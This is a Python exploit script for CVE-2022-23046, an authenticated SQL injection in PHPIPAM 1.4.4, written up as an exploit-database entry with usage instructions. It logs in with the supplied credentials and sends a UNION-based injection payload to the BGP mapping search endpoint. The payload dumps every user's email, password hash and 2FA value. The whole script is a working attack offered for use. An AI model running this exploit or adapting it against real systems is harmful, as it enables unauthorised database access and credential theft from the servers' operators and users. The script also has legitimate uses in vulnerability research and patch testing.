# Exploit Title: PHPIPAM 1.4.4 - SQLi (Authenticated)
# Google Dork: [if applicable]
# Date: 20/01/2022
# Exploit Author: Rodolfo "Inc0gbyt3" Tavares
# Vendor Homepage: https://github.com/phpipam/phpipam
# Software Link: https://github.com/phpipam/phpipam
# Version: 1.4.4
# Tested on: Linux/Windows
# CVE : CVE-2022-23046

import requests
import sys
import argparse

################
"""
Author of exploit: Rodolfo 'Inc0gbyt3' Tavares
CVE: CVE-2022-23046
Type: SQL Injection

Usage:

$ python3 -m pip install requests
$ python3 exploit.py -u http://localhost:8082 -U <admin> -P <password>
"""
###############

__author__ = "Inc0gbyt3"

menu = argparse.ArgumentParser(description="[+] Exploit for PHPIPAM Version: 1.4.4 Authenticated SQL Injection\n CVE-2022-23046")
menu.add_argument("-u", "--url", help="[+] URL of target, example: https://phpipam.target.com", type=str)
menu.add_argument("-U", "--user", help="[+] Username", type=str)
menu.add_argument("-P", "--password", help="[+] Password", type=str)
args = menu.parse_args()

if len(sys.argv) < 3:
    menu.print_help()

target = args.url
user = args.user
password = args.password


def get_token():
    u = f"{target}/app/login/login_check.php"

    try:
        r = requests.post(u, verify=False, timeout=10, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, data={"ipamusername":user, "ipampassword":password})
        headers = r.headers['Set-Cookie']
        headers_string = headers.split(';')
        for s in headers_string:
            if "phpipam" in s and "," in s: # double same cookie Check LoL
                cookie = s.strip(',').lstrip()
                return cookie
    except Exception as e:
        print(f"[+] {e}")


def exploit_sqli():
    cookie = get_token()
    xpl = f"{target}/app/admin/routing/edit-bgp-mapping-search.php"
    data = {
        "subnet":'pwn"union select(select concat(@:=0x3a,(select+count(*) from(users)where(@:=concat(@,email,0x3a,password,"0x3a",2fa))),@)),2,3,user() -- -', # dios query dump all :)
        "bgp_id":1
    }

    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": cookie
    }

    try:
        r = requests.post(xpl, verify=False, timeout=10, headers=headers, data=data)
        if "admin" in r.text or "rounds" in r.text:
            print("[+] Vulnerable..\n\n")
            print(f"> Users and hash passwords: \n\n{r.text}")
            print("\n\n> DONE <")
    except Exception as e:
        print(f"[-] {e}")



if __name__ == '__main__':
    exploit_sqli()